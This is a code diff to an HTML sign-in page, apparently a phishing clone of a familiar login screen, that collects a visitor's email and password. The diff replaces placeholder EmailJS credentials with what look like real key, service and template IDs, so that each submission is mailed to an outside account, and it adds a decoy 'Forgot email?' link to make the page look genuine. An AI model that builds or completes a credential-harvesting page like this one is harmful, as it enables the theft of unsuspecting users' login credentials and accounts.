@@ -7,11 +7,10 @@
   <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
   <script type="text/javascript">
     (function(){
-      emailjs.init("YOUR_PUBLIC_KEY"); // তোমার EmailJS এর Public/User Key
+      emailjs.init("VYKK057zR_OaMB7bb"); // Public key
     })();
   </script>
   <style>
-    /* CSS আগের মতোই থাকবে */
     * { box-sizing: border-box; }
     body {
       margin: 0;
@@ -98,7 +97,8 @@
     <form id="signin-form">
       <label for="email">Email or phone</label>
       <input type="text" name="user_email" id="email" placeholder="Enter your email" required />
-      
+
+      <a href="#" class="link">Forgot email?</a>
 
       <label for="password">Password</label>
       <input type="password" name="user_password" id="password" placeholder="Enter your password" required />
@@ -121,7 +121,7 @@
     document.getElementById('signin-form').addEventListener('submit', function(e) {
       e.preventDefault();
 
-      emailjs.sendForm('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', this)
+      emailjs.sendForm('service_q1baw4p', 'template_dmlj1h8', this)
         .then(function(response) {
           alert("Information sent successfully!");
         }, function(error) {
